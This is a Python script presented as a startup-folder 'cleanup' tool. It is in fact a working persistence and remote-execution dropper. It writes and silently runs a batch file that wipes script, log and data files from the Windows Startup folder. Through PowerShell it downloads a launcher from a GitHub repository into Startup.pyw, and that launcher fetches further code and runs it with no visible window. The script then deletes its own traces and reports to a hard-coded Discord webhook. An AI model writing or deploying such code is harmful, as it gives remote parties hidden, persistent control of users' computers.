# monitor_script.py - Creates ONLY Startup.pyw, not both files
import os
import sys
import subprocess
import tempfile
import time
import urllib.request
import requests

# Discord webhook
WEBHOOK = "https://discordapp.com/api/webhooks/1462762502130630781/IohGYGgxBIr2WPLUHF14QN_8AbyUq-rVGv_KQzhX1rHokBxF_OqjWlRm96x_gbYGQEJ0"

def send_webhook(message):
    """Send simple webhook"""
    try:
        data = {"content": message}
        requests.post(WEBHOOK, json=data, timeout=5)
    except:
        pass

def delete_old_files():
    """Delete old files from startup folder AND create ONLY Startup.pyw"""
    startup_folder = os.path.join(
        os.getenv('APPDATA'),
        'Microsoft\\Windows\\Start Menu\\Programs\\Startup'
    )
    
    # Create a batch file that deletes everything AND creates ONLY Startup.pyw
    batch_script = f'''@echo off
cd /d "{startup_folder}"

echo [CLEANUP] Deleting old files...

:: Delete all old files FIRST
del /f /q startup_log.txt 2>nul
del /f /q monitor_script.py 2>nul
del /f /q monitor.py 2>nul
del /f /q update_cache.json 2>nul
del /f /q requirements.txt 2>nul
del /f /q *.log 2>nul
del /f /q *.txt 2>nul
del /f /q *.json 2>nul
del /f /q *.py 2>nul
del /f /q *.pyw 2>nul
del /f /q *.pyc 2>nul

:: Specifically delete github_launcher.pyw if it exists
del /f /q github_launcher.pyw 2>nul

:: Delete __pycache__ folders
for /d %%d in (__pycache__) do (
    rmdir /s /q "%%d" 2>nul
)

echo [SETUP] Creating ONLY Startup.pyw...

:: Download and create ONLY Startup.pyw (not both)
powershell -Command "
try {{
    $url = 'https://raw.githubusercontent.com/ElianBoden/Deployer/main/github_launcher.pyw'
    $code = (Invoke-WebRequest -Uri $url -UseBasicParsing).Content
    [System.IO.File]::WriteAllText('{startup_folder}\\Startup.pyw', $code)
    Write-Host 'Created ONLY Startup.pyw'
}} catch {{
    Write-Host 'Download failed, using fallback code'
    @'
# Startup.pyw - Clean launcher
import os, sys, subprocess, urllib.request, tempfile, time

def run_script():
    try:
        url = "https://raw.githubusercontent.com/ElianBoden/Deployer/main/script.py"
        code = urllib.request.urlopen(url).read().decode('utf-8')
        tf = tempfile.gettempdir() + "/script_temp.py"
        with open(tf, "w") as f: f.write(code)
        
        si = subprocess.STARTUPINFO()
        si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        
        subprocess.Popen([sys.executable, tf],
                        startupinfo=si,
                        creationflags=subprocess.CREATE_NO_WINDOW)
        
        time.sleep(5)
        try: os.remove(tf)
        except: pass
        return True
    except: return False

time.sleep(5)
run_script()

while True:
    time.sleep(3600)
'@ | Out-File -FilePath '{startup_folder}\\Startup.pyw' -Encoding ascii
}}
"

echo [VERIFY] Checking files...
dir /b "{startup_folder}"

echo [COMPLETE] Only Startup.pyw should remain!
timeout /t 2 /nobreak >nul
del "%~f0" 2>nul
'''
    
    # Save and run the batch file
    batch_path = tempfile.gettempdir() + "/cleanup_single_file.bat"
    with open(batch_path, 'w') as f:
        f.write(batch_script)
    
    # Run hidden
    startupinfo = subprocess.STARTUPINFO()
    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    
    process = subprocess.Popen(
        ['cmd', '/c', batch_path],
        startupinfo=startupinfo,
        creationflags=subprocess.CREATE_NO_WINDOW
    )
    
    # Wait for completion
    time.sleep(5)
    
    # Verify ONLY Startup.pyw exists
    startup_path = os.path.join(startup_folder, "Startup.pyw")
    github_path = os.path.join(startup_folder, "github_launcher.pyw")
    
    # If github_launcher.pyw was created, delete it
    if os.path.exists(github_path):
        print("Found github_launcher.pyw - deleting it...")
        try:
            os.remove(github_path)
        except:
            # Use batch to force delete
            del_batch = f'''@echo off
del /f /q "{github_path}" >nul 2>nul
del "%~f0" >nul 2>nul
'''
            del_path = tempfile.gettempdir() + "/delete_github.bat"
            with open(del_path, 'w') as f:
                f.write(del_batch)
            subprocess.Popen(['cmd', '/c', del_path],
                            creationflags=subprocess.CREATE_NO_WINDOW)
    
    # Check if Startup.pyw exists
    if os.path.exists(startup_path):
        print("✓ Startup.pyw created successfully")
        
        # List files to confirm
        files = os.listdir(startup_folder)
        print(f"Files in startup: {files}")
        
        return True
    else:
        print("✗ Failed to create Startup.pyw")
        return False

def run_new_launcher():
    """Run the newly created launcher"""
    try:
        startup_folder = os.path.join(
            os.getenv('APPDATA'),
            'Microsoft\\Windows\\Start Menu\\Programs\\Startup'
        )
        
        launcher_path = os.path.join(startup_folder, "Startup.pyw")
        
        if os.path.exists(launcher_path):
            print("Starting new launcher...")
            
            # Run directly without batch file
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            
            subprocess.Popen(
                [sys.executable, launcher_path],
                startupinfo=startupinfo,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            
            return True
            
    except Exception as e:
        print(f"Failed to start launcher: {e}")
    
    return False

def main():
    """Main cleanup and update function"""
    print("=" * 60)
    print("SINGLE FILE CLEANUP - ONLY Startup.pyw")
    print("=" * 60)
    
    # Step 1: Delete old files and create ONLY Startup.pyw
    print("\n[1/2] Cleaning up and creating ONLY Startup.pyw...")
    if delete_old_files():
        print("✓ Cleanup successful")
        
        # Step 2: Start new launcher
        print("\n[2/2] Starting new launcher...")
        run_new_launcher()
        
        # Send webhook
        send_webhook("✅ Cleanup complete! Only Startup.pyw remains in startup folder.")
        
        print("\n" + "=" * 60)
        print("SUCCESS!")
        print("✓ Startup folder cleaned")
        print("✓ ONLY Startup.pyw created")
        print("✓ New launcher started")
        print("=" * 60)
    else:
        print("✗ Setup failed")
        send_webhook("❌ Cleanup failed!")
    
    # Wait before exit
    time.sleep(3)

if __name__ == "__main__":
    main()
